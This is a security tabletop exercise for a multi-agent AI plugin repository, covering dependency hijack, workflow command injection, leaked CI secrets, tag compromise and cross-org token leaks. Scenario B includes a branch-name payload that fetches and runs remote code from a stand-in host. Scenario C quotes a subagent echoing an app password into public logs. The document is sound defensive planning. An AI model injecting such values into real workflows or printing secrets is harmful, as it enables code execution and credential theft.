# Security Tabletop Exercise — Multi-Agent OS

> **Mirror**: [VKS-1956](https://vek.atlassian.net/browse/VKS-1956) — Wave 3 supply-chain hardening
> **Last reviewed**: 2026-05-16
> **Owner**: @ekson73
> **Cadence**: every 6 months, or after any HIGH/CRITICAL advisory affecting a direct dependency

## 1. Purpose

A tabletop exercise is a structured walk-through of attack scenarios where the team simulates response without touching production. It surfaces gaps in detection, escalation, and recovery — before a real incident exposes them. This document is the canonical scenario log for `ekson73/multi-agent-os`.

## 2. Threat Model Summary

This repo distributes a Claude Code plugin that orchestrates AI agents. The blast radius of a compromise spans:

| Asset | Why it matters |
|-------|---------------|
| `plugin.json` + `hooks/hooks.json` | Loaded by every consumer; arbitrary shell on `SessionStart`, `PreDelegate`, `PostDelegate` |
| `plugin-scripts/*.sh` | Executes in consumer's session with their credentials |
| `mcp-tools/maos-mcp-hub/` | Multi-persona Atlassian gateway — holds Bitbucket app passwords + Jira API tokens at runtime |
| GitHub Actions secrets | `GITHUB_TOKEN`, any cross-org tokens |
| Release tags | Consumers pin to tags; a poisoned tag propagates |

## 3. Scenarios

Each scenario describes an attacker action, the expected detection signal, the response, and the residual gap to close.

### Scenario A — Malicious dependency (Shai-Hulud style)

**Attack**: A transitive dependency of `fastmcp` or `httpx` is hijacked on PyPI (account takeover or typosquat). The poisoned wheel exfiltrates env vars on import. Consumer projects pull the new version on next `pip install -r requirements.txt`.

**Detection signals**:
- Daily Dependabot security PR for the affected package.
- `pip-audit --strict` step in `supply-chain-sentinel.yml` fails on the next scheduled run (cron 09:00 UTC).
- Trivy fs flags the advisory in the SARIF upload to GitHub code scanning.

**Response**:
1. Pin the previous known-good version in `requirements.txt`; merge as hotfix.
2. Cut a patch release tag with notes pointing to the advisory.
3. Notify consumers via Sentinel `alert_schema.json` (severity HIGH).
4. Rotate any Bitbucket/Jira tokens that loaded the gateway since the last green CI run.

**Residual gap**: No reproducible builds via hash-pinned lockfile yet. **Mitigation**: migrate to `pip-compile --generate-hashes` (tracked, P1).

### Scenario B — Workflow command injection (CWE-78)

**Attack**: A PR author crafts a branch name like `feature/$(curl evil/x|sh)`. A workflow uses `${{ github.event.pull_request.head.ref }}` directly inside `run: |`, executing arbitrary code with the runner's permissions.

**Detection signals**:
- `supply-chain-sentinel.yml` itself documents the anti-pattern in comments.
- Trivy fs config scanning detects unsafe expression contexts (when enabled at config level — TODO).
- Code review (CODEOWNERS auto-request for `/.github/workflows/`).

**Response**:
1. Treat as a workflow bug, not just a malicious PR — same pattern can be triggered by friendlies.
2. Audit *all* `run:` blocks for direct `${{ }}` interpolation. Rewrite as `env:` + `"$VAR"`.
3. Revoke the `GITHUB_TOKEN` for that run (`actions/cancel-workflow-run`) and review audit log for cross-repo writes.

**Residual gap**: No automated linter for this anti-pattern. **Mitigation**: add `zizmor` or `actionlint` scan job (tracked, P1).

### Scenario C — Leaked Bitbucket app password in CI logs

**Attack**: A subagent prints the value of `BITBUCKET_APP_PASSWORD_DEV` via `echo "$BITBUCKET_APP_PASSWORD_DEV"` inside a debug step. The log is public for any PR from a fork.

**Detection signals**:
- `gitleaks` job catches it if the value lands in a committed file.
- GitHub secret scanning catches known Bitbucket token shapes in logs (push protection enabled at org level).
- Manual review of failed CI runs.

**Response**:
1. **Immediately rotate** all Bitbucket app passwords for the affected persona accounts.
2. Delete the workflow run logs (`gh run delete <id>`) — note logs may already be cached by third parties.
3. Audit Bitbucket activity log for the 60 minutes following the leak.
4. Open a HIGH-severity advisory and notify Vek `vek-im` security if cross-org tokens are involved.

**Residual gap**: Logs are publicly visible by default. **Mitigation**: ban `echo $SECRET` patterns via pre-push hook; tracked in GaaS.

### Scenario D — Compromised release tag

**Attack**: An attacker with stolen maintainer credentials force-pushes tag `v1.5.0` to point at a commit containing a backdoor in `plugin-scripts/session-start.sh`.

**Detection signals**:
- Branch protection rule blocks force-push to tags (verify in repo settings).
- OpenSSF Scorecard `Signed-Releases` and `Branch-Protection` scores drop.
- Consumers using `claude plugins install` will see an unfamiliar SHA when reinstalling.

**Response**:
1. Revoke the maintainer's PAT and rotate `GITHUB_TOKEN` scopes.
2. Re-tag from a known-good commit with `v1.5.1` (never re-publish the poisoned tag).
3. Publish an advisory listing the bad SHA explicitly so consumers can grep their lockfiles.
4. Audit `actions/cache` for any cross-run pollution.

**Residual gap**: No release artifact signing (cosign/sigstore) yet. **Mitigation**: add signed-release workflow (tracked, P2).

### Scenario E — Cross-org reciprocity abuse (Vek → ekson73)

**Attack**: A token issued in Vek org for cross-org coordination leaks into `ekson73/multi-agent-os` CI via a forked PR.

**Detection signals**:
- gitleaks job flags Vek-shaped tokens.
- Repo policy: zero Vek tokens in this repo's CI (issue #52 constraint).

**Response**:
1. Revoke the leaked Vek token via Vek devops-admins channel.
2. Confirm no Vek scopes are still bound to this repo's secrets (`gh secret list`).
3. File coordination note on the Jira mirror (VKS-1956).

**Residual gap**: Cross-org boundary enforcement relies on convention. **Mitigation**: ADR-020 input to Vek marketplace will codify reciprocity rules.

## 4. Detection Coverage Matrix

| Scenario | Trivy | pip-audit | gitleaks | Scorecard | Dependabot |
|----------|:-----:|:---------:|:--------:|:---------:|:----------:|
| A — malicious dep | ✅ | ✅ | — | — | ✅ |
| B — CWE-78 in workflow | partial | — | — | ✅ | — |
| C — secret in log | — | — | ✅ | — | — |
| D — compromised tag | — | — | — | ✅ | — |
| E — cross-org token leak | — | — | ✅ | — | — |

## 5. Roles & Escalation

| Role | Who | Responsibility |
|------|-----|---------------|
| Incident Lead | @ekson73 | Owns triage, decides on rotation/hotfix |
| Coordinator (Vek side) | devops-admins | Cross-org rotation + advisory mirror |
| Communicator | @ekson73 | Publishes advisory, notifies consumers |

Escalation: HIGH/CRITICAL → page within 15 min via configured channel; MEDIUM → next business day.

## 6. Next Review

- **Trigger**: 2026-11-16 (6-month cadence) **or** first HIGH/CRITICAL advisory on a direct dependency, whichever comes first.
- **Format**: 60-minute walk-through; one scenario randomly selected as the live drill.
- **Output**: append a new section "Drill log YYYY-MM-DD" with what was tested, what failed, and remediations opened as issues.
